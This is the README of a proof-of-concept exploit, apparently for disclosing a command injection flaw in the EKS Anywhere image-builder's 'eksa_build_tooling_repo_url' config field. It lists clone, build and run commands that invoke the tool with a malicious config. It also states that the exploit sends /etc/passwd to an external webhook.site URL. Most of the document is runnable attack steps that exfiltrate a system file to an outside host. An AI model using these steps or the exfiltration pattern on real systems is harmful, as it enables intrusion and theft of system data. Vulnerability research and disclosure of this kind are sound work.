# EKS Anywhere Image Builder - Command Injection PoC

Shell command injection via `eksa_build_tooling_repo_url` config field.

## Steps

```bash
# 1. Clone this repo
git clone https://github.com/helitestacc/anywhere.git && cd anywhere

# 2. Build image-builder (one-time)
git clone --depth 1 https://github.com/aws/eks-anywhere-build-tooling.git /tmp/build-tooling
cd /tmp/build-tooling/projects/aws/image-builder && go build -o /usr/local/bin/image-builder . && cd -

# 3. Run exploit
image-builder build --os ubuntu --hypervisor vsphere --release-channel 1-31 \
  --vsphere-config malicious-config.json --air-gapped --manifest-tarball manifest.tar
```

## Verify
Check https://webhook.site/25ce9523-a606-4147-a549-b95795f250c9 for /etc/passwd
